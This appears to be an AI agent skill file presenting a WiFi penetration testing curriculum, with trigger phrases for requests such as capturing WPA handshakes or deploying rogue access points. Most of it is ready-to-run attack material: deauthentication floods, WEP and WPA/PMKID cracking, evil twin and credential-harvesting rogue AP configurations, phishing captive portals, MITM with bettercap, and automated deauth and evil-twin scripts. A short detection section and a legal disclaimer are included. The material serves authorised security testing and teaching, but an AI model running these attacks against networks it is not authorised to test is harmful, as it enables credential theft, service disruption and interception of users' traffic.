---
name: wireless-security-wifi-penetration-testing
description: Comprehensive wireless security and WiFi penetration testing curriculum covering 802.11 protocols, WEP/WPA/WPA2/WPA3 attacks, and enterprise wireless assessment
triggers:
  - "how do I capture a WPA handshake"
  - "crack WEP encryption with aircrack"
  - "set up evil twin access point"
  - "perform wireless reconnaissance"
  - "configure monitor mode on wifi adapter"
  - "crack WPA2 PSK with hashcat"
  - "test WPA3 security"
  - "deploy rogue access point"
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This is a comprehensive, hands-on curriculum for wireless security and WiFi penetration testing covering 802.11 standards, encryption protocols (WEP/WPA/WPA2/WPA3), reconnaissance, traffic analysis, and enterprise wireless assessment. Built around the aircrack-ng suite and supplementary tools on Kali Linux.

## What This Project Provides

- **Structured learning path**: 14 modules across 4 phases (Fundamentals → Recon & Bypass → Attacks → Enterprise)
- **Practical wireless attacks**: WEP cracking, WPA/WPA2 handshake capture, PMKID attacks, evil twin APs, deauthentication
- **Enterprise assessment**: WPA-Enterprise (EAP/RADIUS) testing and hardening
- **Tool mastery**: aircrack-ng suite, hashcat, hcxdumptool, hostapd, kismet, wireshark
- **Defense integration**: Each attack paired with detection and mitigation strategies

## Prerequisites & Hardware

**Required Hardware:**
- Injection-capable WiFi adapter (Atheros AR9271 or Ralink RT3070/RT5372 chipset)
- Test access point you own
- Client device for testing

**Software Environment:**
- Kali Linux (bare-metal recommended for timing-sensitive attacks)
- USB passthrough if running virtualized

**Verify adapter capabilities:**
```bash
# Check for monitor mode support
sudo airmon-ng

# Start monitor mode
sudo airmon-ng start wlan0

# Test packet injection
sudo aireplay-ng --test wlan0mon
```

## Installation & Setup

### Core Tools Installation

```bash
# Update package lists
sudo apt update

# Core aircrack-ng suite (usually pre-installed on Kali)
sudo apt install aircrack-ng

# Additional wireless tools
sudo apt install hashcat hcxdumptool hcxtools reaver bully kismet wireshark

# Rogue AP tools
sudo apt install hostapd dnsmasq wifiphisher

# Optional: WPA3 testing tools
sudo apt install wpa_supplicant hostapd-wpe
```

### Adapter Configuration

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify interface (typically wlan0mon or wlan0)
iwconfig

# Set regulatory domain (replace US with your country code)
sudo iw reg set US

# Verify
iw reg get
```

## Phase 1: Wireless Reconnaissance

### Discover Networks

```bash
# Scan all channels and bands
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng --channel 6 wlan0mon

# Filter by BSSID and write capture
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon

# Discover hidden SSIDs with kismet
sudo kismet -c wlan0mon
```

### Identify Clients

```bash
# Show clients connected to specific AP
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 wlan0mon

# Monitor specific client
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --essid "TargetNetwork" -c 6 -w capture wlan0mon
```

## Phase 2: WEP Attacks

### ARP Replay Attack

```bash
# Start capture on target AP
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w wep_capture wlan0mon

# In new terminal: fake authentication
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC:HERE wlan0mon

# ARP replay to generate IVs
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YOUR:MAC:HERE wlan0mon

# Once 50k+ IVs collected, crack
sudo aircrack-ng wep_capture-01.cap
```

### Chop-Chop Attack

```bash
# Perform chop-chop attack
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h YOUR:MAC:HERE wlan0mon

# Forge ARP packet from output
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC:HERE -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-0627-161120.xor -w arp-request

# Inject forged packet
sudo aireplay-ng -2 -r arp-request wlan0mon
```

### Caffe Latte (Client-Side Attack)

```bash
# Set up fake AP with same ESSID as target
sudo airbase-ng -c 6 -e "TargetSSID" wlan0mon

# Wait for client to connect and generate IVs
# Monitor in airodump-ng
sudo airodump-ng -c 6 --bssid YOUR:AP:MAC -w caffe wlan0mon

# Crack when sufficient IVs collected
sudo aircrack-ng caffe-01.cap
```

## Phase 3: WPA/WPA2 Attacks

### Handshake Capture

```bash
# Start capture on target
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake wlan0mon

# In new terminal: deauthenticate client to force handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:HERE wlan0mon

# Verify handshake captured (look for "WPA handshake" in airodump-ng)

# Clean capture file (optional)
wpaclean clean.cap handshake-01.cap
```

### Dictionary Attack with aircrack-ng

```bash
# Crack with wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Crack with multiple CPU cores
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF -l key.txt handshake-01.cap
```

### GPU Acceleration with hashcat

```bash
# Convert capture to hashcat format
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# Verify hash
cat hash.hc22000

# Crack with hashcat (WPA/WPA2 mode 22000)
hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With GPU acceleration and rules
hashcat -m 22000 -a 0 -w 3 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked password
hashcat -m 22000 hash.hc22000 --show
```

### PMKID Attack (Clientless)

```bash
# Capture PMKID (no client needed)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack PMKID
hashcat -m 22000 -a 0 pmkid.hc22000 wordlist.txt

# Alternative: use hcxtools for targeted capture
sudo hcxdumptool -i wlan0mon --filterlist_ap=targets.txt -o targeted.pcapng
```

## Phase 4: Evil Twin & Rogue AP

### Basic Evil Twin with hostapd

**hostapd.conf:**
```conf
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
```

**Deploy:**
```bash
# Start hostapd
sudo hostapd hostapd.conf

# In new terminal: configure DHCP with dnsmasq
sudo dnsmasq -C dnsmasq.conf -d

# Configure IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Set up NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

**dnsmasq.conf:**
```conf
interface=wlan0
dhcp-range=192.168.1.50,192.168.1.150,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8,8.8.4.4
server=8.8.8.8
log-queries
log-dhcp
```

### WPA Evil Twin with Captive Portal

```bash
# Using wifiphisher
sudo wifiphisher -aI wlan0 -eI eth0 -p firmware-upgrade

# Or with custom portal
sudo wifiphisher -aI wlan0 -eI eth0 --handshake-capture
```

### Credential Harvesting Rogue AP

**hostapd-wpe.conf (for EAP credential capture):**
```conf
interface=wlan0
driver=nl80211
ssid=CorpWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
```

```bash
# Run hostapd-wpe to capture enterprise credentials
sudo hostapd-wpe hostapd-wpe.conf

# Monitor captured credentials
tail -f /var/log/hostapd-wpe.log
```

## Phase 5: Enterprise WPA (EAP/RADIUS) Testing

### FreeRADIUS Setup for Testing

```bash
# Install FreeRADIUS
sudo apt install freeradius

# Configure test user (in /etc/freeradius/3.0/users)
# testuser Cleartext-Password := "testpass"

# Start FreeRADIUS in debug mode
sudo freeradius -X
```

### EAP-PEAP Testing

**wpa_supplicant.conf:**
```conf
network={
    ssid="EnterpriseWiFi"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="testuser"
    password="testpass"
    phase2="auth=MSCHAPV2"
}
```

```bash
# Connect with wpa_supplicant
sudo wpa_supplicant -i wlan0 -c wpa_supplicant.conf -D nl80211

# Test authentication
sudo wpa_cli -i wlan0 status
```

### EAP-TLS Certificate Testing

```bash
# Extract certificates from capture
tshark -r enterprise.pcapng -Y "eap" -T fields -e eap.tls.cert > certs.der

# Analyze certificate chain
openssl x509 -in cert.pem -text -noout

# Test for weak ciphers
sudo nmap --script ssl-enum-ciphers -p 1812 radius-server.example.com
```

## WPA3 Testing

### Dragonblood Attacks

```bash
# Install wpa_supplicant with SAE support
sudo apt install wpasupplicant

# Test for downgrade attacks
sudo wpa_supplicant -i wlan0 -c wpa3_test.conf -D nl80211 -dd

# Monitor for side-channel leakage
# (Requires specialized tools and timing analysis)
```

**wpa3_test.conf:**
```conf
network={
    ssid="WPA3Network"
    key_mgmt=SAE
    psk="testpassword"
    ieee80211w=2
}
```

## Wireless IDS/Monitoring

### Kismet Configuration

```bash
# Start kismet
sudo kismet -c wlan0mon

# Access web interface at http://localhost:2501

# Export to pcap for analysis
kismet_log_to_pcap --in Kismet-20240101.kismet --out output.pcap
```

### Detect Rogue APs with airodump-ng

```bash
# Baseline scan (save known APs)
sudo airodump-ng -w baseline --output-format csv wlan0mon

# Compare subsequent scans
sudo airodump-ng -w current --output-format csv wlan0mon

# Analyze for new/suspicious APs
diff baseline-01.csv current-01.csv
```

## Traffic Analysis & MITM

### Capture & Decrypt WPA Traffic

```bash
# Capture with known PSK
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w encrypted wlan0mon

# Decrypt in Wireshark
# Edit → Preferences → Protocols → IEEE 802.11 → Decryption Keys
# Add key: wpa-psk, type PSK in hex (or passphrase:SSID)
```

### Wireless MITM with bettercap

```bash
# Set up transparent proxy
sudo bettercap -iface wlan0

# In bettercap console
> set wifi.interface wlan0mon
> wifi.recon on
> wifi.show
> set wifi.ap.ssid "FreeWiFi"
> set wifi.ap.channel 6
> wifi.ap
> net.probe on
> net.sniff on
```

## Common Patterns & Best Practices

### Pre-Attack Checklist

```bash
#!/bin/bash
# pre_attack.sh - Prepare wireless adapter

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify injection
if sudo aireplay-ng --test wlan0mon | grep -q "Injection is working"; then
    echo "[+] Adapter ready for injection"
else
    echo "[-] Injection failed - check adapter/driver"
    exit 1
fi

# Set regulatory domain
sudo iw reg set US

echo "[+] Setup complete. Interface: wlan0mon"
```

### Automated Handshake Capture

```bash
#!/bin/bash
# capture_handshake.sh - Automated WPA handshake capture

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL=6
OUTPUT="handshake"

# Start capture
sudo airodump-ng --bssid $TARGET_BSSID -c $CHANNEL -w $OUTPUT wlan0mon &
AIRODUMP_PID=$!

sleep 5

# Deauth clients
for i in {1..3}; do
    echo "[*] Deauth attempt $i"
    sudo aireplay-ng -0 5 -a $TARGET_BSSID wlan0mon
    sleep 10
done

# Check for handshake
if grep -q "WPA handshake" $OUTPUT-01.csv; then
    echo "[+] Handshake captured!"
    kill $AIRODUMP_PID
else
    echo "[-] No handshake captured"
fi
```

### Post-Capture Cleanup

```bash
#!/bin/bash
# cleanup.sh - Restore normal operation

# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager

# Flush iptables rules
sudo iptables -F
sudo iptables -t nat -F

echo "[+] Cleanup complete"
```

## Troubleshooting

### Adapter Not Entering Monitor Mode

```bash
# Check driver
lsusb
dmesg | tail

# Reload driver
sudo rmmod ath9k_htc
sudo modprobe ath9k_htc

# Try rfkill
sudo rfkill unblock all

# Manual monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### No Injection Working

```bash
# Verify chipset
lsusb | grep -i "atheros\|ralink"

# Check driver version
modinfo ath9k_htc

# Test with different injection rates
sudo aireplay-ng -9 -i wlan0mon

# Reduce TX power
sudo iw dev wlan0mon set txpower fixed 1000
```

### Handshake Not Capturing

```bash
# Verify client is connected
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Increase deauth count
sudo aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF wlan0mon

# Try broadcast deauth
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Check for 802.11w (PMF) protection
# If enabled, traditional deauth won't work
```

### Hashcat Not Using GPU

```bash
# Check GPU detection
hashcat -I

# Install OpenCL
sudo apt install ocl-icd-libopencl1 nvidia-opencl-icd

# Force GPU usage
hashcat -m 22000 -a 0 -D 2 hash.hc22000 wordlist.txt
```

### Evil Twin Not Attracting Clients

```bash
# Match exact SSID (case-sensitive)
# Use stronger signal (closer to clients)
# Clone target MAC address
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0

# Deauth target AP to force reconnection
sudo aireplay-ng -0 0 -a TARGET:AP:MAC wlan0mon
```

## Configuration Files Reference

### Complete Evil Twin Setup

**start_evil_twin.sh:**
```bash
#!/bin/bash
IFACE=wlan0
SSID="FreeWiFi"
CHANNEL=6

# Configure interface
sudo ip link set $IFACE down
sudo ip addr add 192.168.1.1/24 dev $IFACE
sudo ip link set $IFACE up

# Start hostapd
sudo hostapd /tmp/hostapd.conf &

# Start DHCP
sudo dnsmasq -C /tmp/dnsmasq.conf &

# Enable forwarding
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

echo "[+] Evil twin active on $SSID"
```

### Enterprise Test Environment

**hostapd-radius.conf:**
```conf
interface=wlan0
driver=nl80211
ssid=EnterpriseCorp
hw_mode=g
channel=6

wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1

auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123

eap_server=0
```

## Legal & Ethical Considerations

**CRITICAL**: All techniques documented here require explicit written authorization:

- Only test networks you own or have permission to assess
- Wireless attacks (deauth, rogue APs, handshake capture) are regulated
- RF transmission is subject to local laws and spectrum licensing
- Practice in isolated lab environments only
- Maintain detailed engagement documentation

This skill enables authorized security testing and research only. Unauthorized access is illegal.
